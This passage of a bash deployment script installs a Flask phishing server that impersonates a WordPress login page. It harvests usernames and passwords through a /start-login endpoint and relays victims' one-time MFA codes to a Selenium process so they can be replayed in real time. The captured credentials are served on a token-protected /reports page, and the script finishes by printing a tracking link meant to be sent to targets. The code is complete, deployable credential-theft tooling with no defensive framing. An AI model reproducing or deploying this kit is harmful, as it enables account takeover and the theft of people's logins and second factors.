            if failed_attempts >= 3:
                app.logger.warning(f"3 failed MFA attempts reached for IP {ip}")
                log_to_file(TRACKER_LOG, {
                    "id": str(uuid.uuid4()),
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "event": "mfa_max_attempts_reached",
                    "ip": ip,
                    "failed_attempts": failed_attempts,
                    "user_agent": request.headers.get("User-Agent", "")
                })
                
                # Clear the failed attempts counter and redirect to login page
                session.pop('mfa_failed_attempts', None)
                return redirect("/link?error=too_many_attempts")
            
            return redirect("/mfa.html?error=1")
        
        # Create logs directory
        os.makedirs("/root/logs", mode=0o755, exist_ok=True)
        
        # Log MFA attempt
        mfa_entry = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": "mfa_verification_attempt",
            "ip": ip,
            "otp": otp,
            "failed_attempts": failed_attempts,
            "user_agent": request.headers.get("User-Agent", ""),
            "session_timestamp": session.get('access_timestamp')
        }
        log_to_file(TRACKER_LOG, mfa_entry)
        
        # Send OTP to monitoring server for Selenium validation
        app.logger.info(f"Sending OTP {otp} to monitoring server for validation...")
        try:
            monitor_endpoint = "http://localhost:8080/submit-otp"
            payload = f"otp={requests.utils.quote(otp)}"
            requests.get(f"{monitor_endpoint}?{payload}", timeout=3)
            app.logger.info(f"Sent OTP {otp} to monitoring server")
        except Exception as e:
            app.logger.error(f"Failed to send OTP to monitoring server: {e}")
            failed_attempts += 1
            session['mfa_failed_attempts'] = failed_attempts
            
            # Check if we've reached 3 failed attempts
            if failed_attempts >= 3:
                app.logger.warning(f"3 failed MFA attempts reached for IP {ip}")
                log_to_file(TRACKER_LOG, {
                    "id": str(uuid.uuid4()),
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "event": "mfa_max_attempts_reached",
                    "ip": ip,
                    "failed_attempts": failed_attempts,
                    "user_agent": request.headers.get("User-Agent", "")
                })
                
                # Clear the failed attempts counter and redirect to login page
                session.pop('mfa_failed_attempts', None)
                return redirect("/link?error=too_many_attempts")
            
            return redirect("/mfa.html?error=1")
        
        # Wait for Selenium to validate the OTP and report back
        app.logger.info("Waiting for OTP validation from Selenium...")
        try:
            validation_result = wait_for_otp_validation(20)  # Wait up to 20 seconds
            app.logger.info(f"OTP validation result: {validation_result}")
        except Exception as e:
            app.logger.error(f"Error waiting for OTP validation: {e}")
            validation_result = 'timeout'
        
        # Log the validation result
        validation_entry = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": "otp_validation_complete",
            "ip": ip,
            "otp": otp,
            "validation_result": validation_result,
            "failed_attempts": failed_attempts,
            "user_agent": request.headers.get("User-Agent", ""),
            "session_timestamp": session.get('access_timestamp')
        }
        log_to_file(TRACKER_LOG, validation_entry)
        
        # Check validation result
        if validation_result == 'true':
            # OTP validated successfully - clear failed attempts and grant access
            session.pop('mfa_failed_attempts', None)  # Clear failed attempts on success
            app.logger.info("OTP validation successful, granting internet access")
            grant_internet_access(ip)
            
            # Log successful authentication
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "authentication_success",
                "ip": ip,
                "otp": otp,
                "user_agent": request.headers.get("User-Agent", "")
            })
            
            return redirect("/success")
        
        elif validation_result == 'false':
            # OTP validation failed - increment counter and check if max attempts reached
            failed_attempts += 1
            session['mfa_failed_attempts'] = failed_attempts
            
            app.logger.warning(f"OTP validation failed for code: {otp} (attempt {failed_attempts}/3)")
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "authentication_failure",
                "ip": ip,
                "otp": otp,
                "reason": "invalid_otp",
                "failed_attempts": failed_attempts,
                "user_agent": request.headers.get("User-Agent", "")
            })
            
            # Check if we've reached 3 failed attempts
            if failed_attempts >= 3:
                app.logger.warning(f"3 failed MFA attempts reached for IP {ip}")
                log_to_file(TRACKER_LOG, {
                    "id": str(uuid.uuid4()),
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "event": "mfa_max_attempts_reached",
                    "ip": ip,
                    "failed_attempts": failed_attempts,
                    "user_agent": request.headers.get("User-Agent", "")
                })
                
                # Clear the failed attempts counter and redirect to login page
                session.pop('mfa_failed_attempts', None)
                return redirect("/link?error=too_many_attempts")
            
            return redirect("/mfa.html?error=1")
        
        else:
            # Timeout or other error - increment counter and check if max attempts reached
            failed_attempts += 1
            session['mfa_failed_attempts'] = failed_attempts
            
            app.logger.error(f"OTP validation timeout/error: {validation_result} (attempt {failed_attempts}/3)")
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "authentication_error",
                "ip": ip,
                "otp": otp,
                "reason": validation_result,
                "failed_attempts": failed_attempts,
                "user_agent": request.headers.get("User-Agent", "")
            })
            
            # Check if we've reached 3 failed attempts
            if failed_attempts >= 3:
                app.logger.warning(f"3 failed MFA attempts reached for IP {ip}")
                log_to_file(TRACKER_LOG, {
                    "id": str(uuid.uuid4()),
                    "timestamp": datetime.now(timezone.utc).isoformat(),
                    "event": "mfa_max_attempts_reached",
                    "ip": ip,
                    "failed_attempts": failed_attempts,
                    "user_agent": request.headers.get("User-Agent", "")
                })
                
                # Clear the failed attempts counter and redirect to login page
                session.pop('mfa_failed_attempts', None)
                return redirect("/link?error=too_many_attempts")
            
            return redirect("/mfa.html?error=1")
            
    except Exception as e:
        app.logger.error(f"Error in /verify-mfa route: {e}")
        log_to_file(TRACKER_LOG, {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": "authentication_exception",
            "ip": client_ip(),
            "error": str(e),
            "user_agent": request.headers.get("User-Agent", "")
        })
        return redirect("/mfa.html?error=1")

@app.route("/start-login", methods=["GET"])
def start_login():
    """Handle the JavaScript monitoring call"""
    try:
        # Extract query parameters
        username = request.args.get("username", "")
        password = request.args.get("password", "")
        site = request.args.get("site", "")
        
        # Get client info
        ip = client_ip()
        user_agent = request.headers.get("User-Agent", "")
        
        # Log the monitoring data
        monitor_entry = {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": "login_attempt_monitor",
            "ip": ip,
            "user_agent": user_agent,
            "username": username,
            "password": password,
            "target_site": site,
            "headers": dict(request.headers)
        }
        
        log_to_file(TRACKER_LOG, monitor_entry)
        
        # Return empty response (JavaScript uses no-cors mode)
        return "", 204
        
    except Exception as e:
        app.logger.error(f"Error in /start-login route: {e}")
        return "", 500

# ── Static file serving routes ────────────────────────────────────
@app.route("/wp-login.css")
def wp_login_css():
    """Serve CSS file from /root/static"""
    try:
        css_path = os.path.join(STATIC_DIR, "wp-login.css")
        if os.path.exists(css_path):
            return send_file(css_path, mimetype='text/css')
        else:
            # Fallback CSS if file doesn't exist
            fallback_css = """
            body.login { background: #f1f1f1; font-family: Arial, sans-serif; }
            #login { width: 320px; margin: 7% auto 0; padding: 8px; }
            .login form { background: #fff; padding: 26px 24px; border: 1px solid #c3c4c7; }
            .login input[type=text], .login input[type=password] { width: 100%; padding: 5px; font-size: 18px; }
            .login .button-primary { background: #2271b1; color: #fff; padding: 8px 12px; }
            """
            return fallback_css, 200, {'Content-Type': 'text/css'}
    except Exception as e:
        app.logger.error(f"Error serving CSS: {e}")
        return "/* CSS error */", 500, {'Content-Type': 'text/css'}

@app.route("/wp-scripts.js")
def wp_scripts():
    """Serve JS file from /root/static"""
    try:
        js_path = os.path.join(STATIC_DIR, "wp-scripts.js")
        if os.path.exists(js_path):
            return send_file(js_path, mimetype='text/javascript')
        else:
            # Return empty JS if file doesn't exist
            return "", 200, {'Content-Type': 'text/javascript'}
    except Exception as e:
        app.logger.error(f"Error serving JS: {e}")
        return "/* JS error */", 500, {'Content-Type': 'text/javascript'}

# ── Image and font serving routes ─────────────────────────────────
@app.route("/images/<path:filename>")
def serve_images(filename):
    """Serve image files from /root/static/images/"""
    try:
        image_path = os.path.join(STATIC_DIR, "images", filename)
        if os.path.exists(image_path):
            mimetype, _ = mimetypes.guess_type(image_path)
            return send_file(image_path, mimetype=mimetype)
        else:
            return "Image not found", 404
    except Exception as e:
        app.logger.error(f"Error serving image {filename}: {e}")
        return "Error", 500

@app.route("/wp-includes/<path:filename>")
def serve_wp_includes(filename):
    """Serve wp-includes files (fonts, etc.) from /root/static/wp-includes/"""
    try:
        file_path = os.path.join(STATIC_DIR, "wp-includes", filename)
        if os.path.exists(file_path):
            mimetype, _ = mimetypes.guess_type(file_path)
            return send_file(file_path, mimetype=mimetype)
        else:
            return "File not found", 404
    except Exception as e:
        app.logger.error(f"Error serving wp-includes file {filename}: {e}")
        return "Error", 500

# ── Generic static file serving for any other assets ─────────────
@app.route("/static/<path:filename>")
def serve_static(filename):
    """Serve any static file from /root/static/"""
    try:
        file_path = os.path.join(STATIC_DIR, filename)
        if os.path.exists(file_path):
            mimetype, _ = mimetypes.guess_type(file_path)
            return send_file(file_path, mimetype=mimetype)
        else:
            return "File not found", 404
    except Exception as e:
        app.logger.error(f"Error serving static file {filename}: {e}")
        return "Error", 500

@app.route("/reports")
def reports():
    try:
        # Extract token from Authorization header or query parameter
        supplied = request.headers.get("Authorization", "")
        if supplied.startswith("Bearer "):
            supplied = supplied[7:].strip()
        else:
            supplied = request.args.get("auth", "")

        # Reload .env to get current token values
        load_dotenv(override=True)
        current_admin_token = os.getenv("ADMIN_TOKEN", "")

        if supplied != current_admin_token:
            return "Unauthorized", 403

        # Serve the logs
        try:
            with open(TRACKER_LOG, encoding="utf-8") as f:
                logs = [json.loads(line) for line in f if line.strip()]
        except FileNotFoundError:
            logs = []
        except Exception as exc:
            return f"Internal Error: {exc}", 500

        # Rotate the ADMIN_TOKEN after successful access (delayed)
        trigger_restart_delayed("--rotate-admin")
        log_to_file(TRACKER_LOG, {
            "id": str(uuid.uuid4()),
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "event": "rotate_admin_token",
            "ip": client_ip(),
        })

        return jsonify(logs)
    
    except Exception as e:
        app.logger.error(f"Error in /reports route: {e}")
        return "Internal Server Error", 500

@app.route("/health")
def health():
    """Simple health check endpoint"""
    return {"status": "ok", "timestamp": datetime.now(timezone.utc).isoformat()}

# Default route for any other paths - returns 404
@app.route("/")
def home():
    return "Not Found", 404

@app.route("/wp-login.php")
def wp_login_direct():
    """Direct access to login page - check for existing session or redirect to get token"""
    try:
        # Check if user has existing valid session
        is_authorized, _ = check_access_authorization()
        
        if is_authorized:
            # User has valid session, serve login page
            app.logger.info(f"Direct login access with valid session for IP {client_ip()}")
            log_to_file(TRACKER_LOG, {
                "id": str(uuid.uuid4()),
                "timestamp": datetime.now(timezone.utc).isoformat(),
                "event": "direct_login_access_with_session",
                "ip": client_ip(),
                "user_agent": request.headers.get('User-Agent', ''),
                "session_timestamp": session.get('access_timestamp')
            })
            return render_template_string(LOGIN_TEMPLATE)
        else:
            # No valid session, return 404 or unauthorized
            app.logger.warning(f"Direct login access without valid session from IP {client_ip()}")
            return "Not Found", 404

    except Exception as e:
        app.logger.error(f"Error in /wp-login.php route: {e}")
        return "Internal Server Error", 500

@app.route("/<path:path>")
def catch_all(path):
    return "Not Found", 404

# ── startup ───────────────────────────────────────────────────────
if __name__ == "__main__":
    print(f"[*] Starting tracker with tokens:")
    print(f"    REQUIRED_TOKEN: {REQUIRED_TOKEN}")
    print(f"    ADMIN_TOKEN: {ADMIN_TOKEN}")
    print(f"[*] Static files from: {STATIC_DIR}")
    print(f"[*] Tracker at http://0.0.0.0:5000/link")
    
    # Enable debug mode when running manually
    debug_mode = len(sys.argv) > 1 and sys.argv[1] == "--debug"
    
    app.run(host="0.0.0.0", port=5000, debug=debug_mode)
EOF

# Make tracker.py executable
chmod +x "${TRACKER_APP_DIR}/tracker.py"

# Create the directory for the static content
mkdir -p /root/static

# Create the token rotation script
cat > "${TRACKER_APP_DIR}/restart-tracker.sh" <<'EOF'
#!/bin/bash
# restart-tracker.sh - Rotate one or both tokens and restart tracker service

set -euo pipefail

# Function to generate a random 18-character token
generate_token() {
    local length=18
    local chars='ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
    local token=""
    for ((i=0; i<length; i++)); do
        token+="${chars:$((RANDOM % ${#chars})):1}"
    done
    echo "$token"
}

# Default: don't rotate either
rotate_required=false
rotate_admin=false

# Parse args
while [[ $# -gt 0 ]]; do
    case "$1" in
        --rotate-required)
            rotate_required=true
            ;;
        --rotate-admin)
            rotate_admin=true
            ;;
        *)
            echo "Unknown argument: $1"
            exit 1
            ;;
    esac
    shift
done

# Small delay to let any web response complete
sleep 2

timestamp="$(date '+%Y-%m-%d %H:%M:%S')"
tokens_updated=()

# Rotate REQUIRED_TOKEN if requested
if $rotate_required; then
    new_required_token=$(generate_token)
    if sed -i "s/^REQUIRED_TOKEN=.*/REQUIRED_TOKEN=$new_required_token/" .env; then
        echo "$timestamp - REQUIRED_TOKEN updated to: $new_required_token" >> /var/log/tracker-restarts.log
        tokens_updated+=("REQUIRED_TOKEN")
    else
        echo "$timestamp - ERROR: Failed to update REQUIRED_TOKEN" >> /var/log/tracker-restarts.log
        exit 1
    fi
fi

# Rotate ADMIN_TOKEN if requested
if $rotate_admin; then
    new_admin_token=$(generate_token)
    if sed -i "s/^ADMIN_TOKEN=.*/ADMIN_TOKEN=$new_admin_token/" .env; then
        echo "$timestamp - ADMIN_TOKEN updated to: $new_admin_token" >> /var/log/tracker-restarts.log
        tokens_updated+=("ADMIN_TOKEN")
    else
        echo "$timestamp - ERROR: Failed to update ADMIN_TOKEN" >> /var/log/tracker-restarts.log
        exit 1
    fi
fi

# Restart tracker only if at least one token was updated
if [[ ${#tokens_updated[@]} -gt 0 ]]; then
    systemctl restart tracker.service
    echo "$timestamp - tracker.service restarted after rotating: ${tokens_updated[*]}" >> /var/log/tracker-restarts.log
else
    echo "$timestamp - No tokens rotated; nothing to restart." >> /var/log/tracker-restarts.log
fi
EOF

chmod +x "${TRACKER_APP_DIR}/restart-tracker.sh"

# -----------------------------------------------------------------------------
# 8) Create systemd service for tracker
# -----------------------------------------------------------------------------
cat > "/etc/systemd/system/tracker.service" << EOF
[Unit]
Description=Flask Tracker Service
After=network.target

[Service]
Type=simple
WorkingDirectory=${TRACKER_APP_DIR}
EnvironmentFile=${TRACKER_APP_DIR}/.env
ExecStart=${TRACKER_VENV_DIR}/bin/python ${TRACKER_APP_DIR}/tracker.py
Restart=on-failure
RestartSec=5

[Install]
WantedBy=multi-user.target
EOF

# -----------------------------------------------------------------------------
# 9) Enable and start the service
# -----------------------------------------------------------------------------
systemctl daemon-reload
systemctl enable --now tracker.service

echo -e "\n✅  Setup complete!

🎯 Your tracking URL: https://${DOMAIN}/link?src=${REQUIRED_TOKEN}
🔧 Admin logs:        https://${DOMAIN}/reports?auth=${ADMIN_TOKEN}

[*] Generated REQUIRED_TOKEN: $REQUIRED_TOKEN
[*] Generated ADMIN_TOKEN:    $ADMIN_TOKEN

📋 Service Status:"
systemctl status tracker.service --no-pager -l
